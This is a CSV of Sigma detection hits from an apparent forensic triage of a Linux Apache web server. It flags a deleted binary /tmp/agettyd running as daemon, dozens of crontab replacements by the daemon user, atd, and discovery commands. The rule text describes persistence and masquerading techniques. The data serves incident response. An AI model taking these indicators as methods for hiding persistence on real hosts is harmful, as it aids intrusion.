rule,severity,level,table,count,first_utc,last_utc,timestamp_utc,mitre,matched_row,description,rule_id,rule_file
Process Discovery,LOW,low,PROCESSES,1,2021-12-08 18:51:34,2021-12-08 18:51:34,2021-12-08 18:51:34,T1057,"pid=7746; user=root; start_utc=2021-12-08 18:51:34+00:00; exe=/bin/ps; exe_source=journal _EXE (same boot); args=ps -eo pid,user,lstart,args","Detects process discovery commands. Adversaries may attempt to get information about running processes on a system.
Information obtained could be used to gain an understanding of common software/applications running on systems within the network
",4e2f5868-08d4-413d-899f-dc2f1508627b,sigma-rules/rules-threat-hunting\linux\process_creation\proc_creation_lnx_susp_running_process_discovery.yml
Scheduled Task/Job At,LOW,low,PROCESSES,1,2021-10-09 15:06:25,2021-10-09 15:06:25,2021-10-09 15:06:25,T1053.002,pid=1003; ppid=1; user=daemon; owner=root; group=root; start_utc=2021-10-09 15:06:25+00:00; exe=/usr/sbin/atd; exe_source=/proc/<pid>/exe link,"Detects the use of at/atd which are utilities that are used to schedule tasks.
They are often abused by adversaries to maintain persistence or to perform task scheduling for initial or recurring execution of malicious code
",d2d642d7-b393-43fe-bae4-e81ed5915c4b,sigma-rules/rules\linux\process_creation\proc_creation_lnx_at_command.yml
Potentially Suspicious Execution From Tmp Folder,MEDIUM,medium,PROCESSES,1,2021-12-05 08:28:02,2021-12-05 08:28:02,2021-12-05 08:28:02,T1036,pid=24330; ppid=1; user=daemon; owner=daemon; group=daemon; start_utc=2021-12-05 08:28:02+00:00; exe=/tmp/agettyd (deleted); exe_source=/proc/<pid>/exe link,Detects a potentially suspicious execution of a process located in the '/tmp/' folder,312b42b1-bded-4441-8b58-163a3af58775,sigma-rules/rules\linux\process_creation\proc_creation_lnx_susp_execution_tmp_folder.yml
System Network Connections Discovery - Linux,LOW,low,PROCESSES,2,,,,T1049,pid=7978; exe=/usr/bin/lsof; exe_source=lsof txt descriptor; cwd=/root/uac; cwd_source=lsof cwd descriptor,Detects usage of system utilities to discover system network connections,4c519226-f0cd-4471-bd2f-6fbb2bb68a79,sigma-rules/rules\linux\process_creation\proc_creation_lnx_system_network_connections_discovery.yml
System Network Connections Discovery - Linux,LOW,low,PROCESSES,2,,,,T1049,pid=7984; exe=/usr/bin/lsof; exe_source=lsof txt descriptor; cwd=/root/uac; cwd_source=lsof cwd descriptor,Detects usage of system utilities to discover system network connections,4c519226-f0cd-4471-bd2f-6fbb2bb68a79,sigma-rules/rules\linux\process_creation\proc_creation_lnx_system_network_connections_discovery.yml
Process Discovery,LOW,low,PROCESS_MASTER,1,2021-12-08 18:51:34,2021-12-08 18:51:34,2021-12-08 18:51:34,T1057,"pid=7746; user=root; exe=/bin/ps; exe_source=journal _EXE (same boot); cmdline=ps -eo pid,user,lstart,args; start_utc=2021-12-08 18:51:34; sources=ps","Detects process discovery commands. Adversaries may attempt to get information about running processes on a system.
Information obtained could be used to gain an understanding of common software/applications running on systems within the network
",4e2f5868-08d4-413d-899f-dc2f1508627b,sigma-rules/rules-threat-hunting\linux\process_creation\proc_creation_lnx_susp_running_process_discovery.yml
Scheduled Task/Job At,LOW,low,PROCESS_MASTER,1,2021-10-09 15:06:25,2021-10-09 15:06:25,2021-10-09 15:06:25,T1053.002,pid=1003; ppid=1; parent=systemd; user=daemon; state=S; comm=atd; exe=/usr/sbin/atd; exe_source=/proc/<pid>/exe link,"Detects the use of at/atd which are utilities that are used to schedule tasks.
They are often abused by adversaries to maintain persistence or to perform task scheduling for initial or recurring execution of malicious code
",d2d642d7-b393-43fe-bae4-e81ed5915c4b,sigma-rules/rules\linux\process_creation\proc_creation_lnx_at_command.yml
Potentially Suspicious Execution From Tmp Folder,MEDIUM,medium,PROCESS_MASTER,1,2021-12-05 08:28:02,2021-12-05 08:28:02,2021-12-05 08:28:02,T1036,pid=24330; ppid=1; parent=systemd; user=daemon; state=S; comm=agettyd; exe=/tmp/agettyd (deleted); exe_source=/proc/<pid>/exe link,Detects a potentially suspicious execution of a process located in the '/tmp/' folder,312b42b1-bded-4441-8b58-163a3af58775,sigma-rules/rules\linux\process_creation\proc_creation_lnx_susp_execution_tmp_folder.yml
System Network Connections Discovery - Linux,LOW,low,PROCESS_MASTER,2,,,,T1049,"pid=7978; exe=/usr/bin/lsof; exe_source=lsof txt descriptor; cwd=/root/uac; open_files=16; sources=lsof, ps",Detects usage of system utilities to discover system network connections,4c519226-f0cd-4471-bd2f-6fbb2bb68a79,sigma-rules/rules\linux\process_creation\proc_creation_lnx_system_network_connections_discovery.yml
System Network Connections Discovery - Linux,LOW,low,PROCESS_MASTER,2,,,,T1049,"pid=7984; exe=/usr/bin/lsof; exe_source=lsof txt descriptor; cwd=/root/uac; open_files=11; sources=lsof, ps",Detects usage of system utilities to discover system network connections,4c519226-f0cd-4471-bd2f-6fbb2bb68a79,sigma-rules/rules\linux\process_creation\proc_creation_lnx_system_network_connections_discovery.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:05,T1053.003,timestamp_utc=2021-12-08 10:02:05; timestamp=Dec  8 10:02:05; host=ApacheWebServer; process=crontab; pid=12196; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=530,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:07,T1053.003,timestamp_utc=2021-12-08 10:02:07; timestamp=Dec  8 10:02:07; host=ApacheWebServer; process=crontab; pid=12203; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=532,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:07,T1053.003,timestamp_utc=2021-12-08 10:02:07; timestamp=Dec  8 10:02:07; host=ApacheWebServer; process=crontab; pid=12238; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=534,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:07,T1053.003,timestamp_utc=2021-12-08 10:02:07; timestamp=Dec  8 10:02:07; host=ApacheWebServer; process=crontab; pid=12242; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=536,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:08,T1053.003,timestamp_utc=2021-12-08 10:02:08; timestamp=Dec  8 10:02:08; host=ApacheWebServer; process=crontab; pid=12246; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=538,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:08,T1053.003,timestamp_utc=2021-12-08 10:02:08; timestamp=Dec  8 10:02:08; host=ApacheWebServer; process=crontab; pid=12250; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=540,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:08,T1053.003,timestamp_utc=2021-12-08 10:02:08; timestamp=Dec  8 10:02:08; host=ApacheWebServer; process=crontab; pid=12259; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=542,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:08,T1053.003,timestamp_utc=2021-12-08 10:02:08; timestamp=Dec  8 10:02:08; host=ApacheWebServer; process=crontab; pid=12265; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=544,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:09,T1053.003,timestamp_utc=2021-12-08 10:02:09; timestamp=Dec  8 10:02:09; host=ApacheWebServer; process=crontab; pid=12272; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=546,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:09,T1053.003,timestamp_utc=2021-12-08 10:02:09; timestamp=Dec  8 10:02:09; host=ApacheWebServer; process=crontab; pid=12279; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=548,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:09,T1053.003,timestamp_utc=2021-12-08 10:02:09; timestamp=Dec  8 10:02:09; host=ApacheWebServer; process=crontab; pid=12283; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=550,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:09,T1053.003,timestamp_utc=2021-12-08 10:02:09; timestamp=Dec  8 10:02:09; host=ApacheWebServer; process=crontab; pid=12286; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=552,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:10,T1053.003,timestamp_utc=2021-12-08 10:02:10; timestamp=Dec  8 10:02:10; host=ApacheWebServer; process=crontab; pid=12290; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=554,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:10,T1053.003,timestamp_utc=2021-12-08 10:02:10; timestamp=Dec  8 10:02:10; host=ApacheWebServer; process=crontab; pid=12303; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=556,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:10,T1053.003,timestamp_utc=2021-12-08 10:02:10; timestamp=Dec  8 10:02:10; host=ApacheWebServer; process=crontab; pid=12308; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=558,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:10,T1053.003,timestamp_utc=2021-12-08 10:02:10; timestamp=Dec  8 10:02:10; host=ApacheWebServer; process=crontab; pid=12314; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=560,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:11,T1053.003,timestamp_utc=2021-12-08 10:02:11; timestamp=Dec  8 10:02:11; host=ApacheWebServer; process=crontab; pid=12321; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=562,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:11,T1053.003,timestamp_utc=2021-12-08 10:02:11; timestamp=Dec  8 10:02:11; host=ApacheWebServer; process=crontab; pid=12327; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=564,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:11,T1053.003,timestamp_utc=2021-12-08 10:02:11; timestamp=Dec  8 10:02:11; host=ApacheWebServer; process=crontab; pid=12332; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=566,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:11,T1053.003,timestamp_utc=2021-12-08 10:02:11; timestamp=Dec  8 10:02:11; host=ApacheWebServer; process=crontab; pid=12335; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=568,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:11,T1053.003,timestamp_utc=2021-12-08 10:02:11; timestamp=Dec  8 10:02:11; host=ApacheWebServer; process=crontab; pid=12338; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=570,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:12,T1053.003,timestamp_utc=2021-12-08 10:02:12; timestamp=Dec  8 10:02:12; host=ApacheWebServer; process=crontab; pid=12341; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=572,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:13,T1053.003,timestamp_utc=2021-12-08 10:02:13; timestamp=Dec  8 10:02:13; host=ApacheWebServer; process=crontab; pid=12366; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=574,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:13,T1053.003,timestamp_utc=2021-12-08 10:02:13; timestamp=Dec  8 10:02:13; host=ApacheWebServer; process=crontab; pid=12372; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=576,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:13,T1053.003,timestamp_utc=2021-12-08 10:02:13; timestamp=Dec  8 10:02:13; host=ApacheWebServer; process=crontab; pid=12378; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=578,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:13,T1053.003,timestamp_utc=2021-12-08 10:02:13; timestamp=Dec  8 10:02:13; host=ApacheWebServer; process=crontab; pid=12387; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=580,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:14,T1053.003,timestamp_utc=2021-12-08 10:02:14; timestamp=Dec  8 10:02:14; host=ApacheWebServer; process=crontab; pid=12392; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=582,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:14,T1053.003,timestamp_utc=2021-12-08 10:02:14; timestamp=Dec  8 10:02:14; host=ApacheWebServer; process=crontab; pid=12396; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=584,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:14,T1053.003,timestamp_utc=2021-12-08 10:02:14; timestamp=Dec  8 10:02:14; host=ApacheWebServer; process=crontab; pid=12399; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=586,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:14,T1053.003,timestamp_utc=2021-12-08 10:02:14; timestamp=Dec  8 10:02:14; host=ApacheWebServer; process=crontab; pid=12404; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=588,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:15,T1053.003,timestamp_utc=2021-12-08 10:02:15; timestamp=Dec  8 10:02:15; host=ApacheWebServer; process=crontab; pid=12416; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=590,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:15,T1053.003,timestamp_utc=2021-12-08 10:02:15; timestamp=Dec  8 10:02:15; host=ApacheWebServer; process=crontab; pid=12425; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=592,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:15,T1053.003,timestamp_utc=2021-12-08 10:02:15; timestamp=Dec  8 10:02:15; host=ApacheWebServer; process=crontab; pid=12432; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=594,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:15,T1053.003,timestamp_utc=2021-12-08 10:02:15; timestamp=Dec  8 10:02:15; host=ApacheWebServer; process=crontab; pid=12436; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=596,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:15,T1053.003,timestamp_utc=2021-12-08 10:02:15; timestamp=Dec  8 10:02:15; host=ApacheWebServer; process=crontab; pid=12439; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=598,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:16,T1053.003,timestamp_utc=2021-12-08 10:02:16; timestamp=Dec  8 10:02:16; host=ApacheWebServer; process=crontab; pid=12443; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=600,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:16,T1053.003,timestamp_utc=2021-12-08 10:02:16; timestamp=Dec  8 10:02:16; host=ApacheWebServer; process=crontab; pid=12449; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=602,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:16,T1053.003,timestamp_utc=2021-12-08 10:02:16; timestamp=Dec  8 10:02:16; host=ApacheWebServer; process=crontab; pid=12455; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=604,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:16,T1053.003,timestamp_utc=2021-12-08 10:02:16; timestamp=Dec  8 10:02:16; host=ApacheWebServer; process=crontab; pid=12464; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=606,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:17,T1053.003,timestamp_utc=2021-12-08 10:02:17; timestamp=Dec  8 10:02:17; host=ApacheWebServer; process=crontab; pid=12470; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=608,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:17,T1053.003,timestamp_utc=2021-12-08 10:02:17; timestamp=Dec  8 10:02:17; host=ApacheWebServer; process=crontab; pid=12475; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=610,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:17,T1053.003,timestamp_utc=2021-12-08 10:02:17; timestamp=Dec  8 10:02:17; host=ApacheWebServer; process=crontab; pid=12478; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=612,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:17,T1053.003,timestamp_utc=2021-12-08 10:02:17; timestamp=Dec  8 10:02:17; host=ApacheWebServer; process=crontab; pid=12481; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=614,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:18,T1053.003,timestamp_utc=2021-12-08 10:02:18; timestamp=Dec  8 10:02:18; host=ApacheWebServer; process=crontab; pid=12484; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=616,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:18,T1053.003,timestamp_utc=2021-12-08 10:02:18; timestamp=Dec  8 10:02:18; host=ApacheWebServer; process=crontab; pid=12492; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=618,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:18,T1053.003,timestamp_utc=2021-12-08 10:02:18; timestamp=Dec  8 10:02:18; host=ApacheWebServer; process=crontab; pid=12498; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=620,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:19,T1053.003,timestamp_utc=2021-12-08 10:02:19; timestamp=Dec  8 10:02:19; host=ApacheWebServer; process=crontab; pid=12504; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=622,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:19,T1053.003,timestamp_utc=2021-12-08 10:02:19; timestamp=Dec  8 10:02:19; host=ApacheWebServer; process=crontab; pid=12508; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=624,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:19,T1053.003,timestamp_utc=2021-12-08 10:02:19; timestamp=Dec  8 10:02:19; host=ApacheWebServer; process=crontab; pid=12514; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=626,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
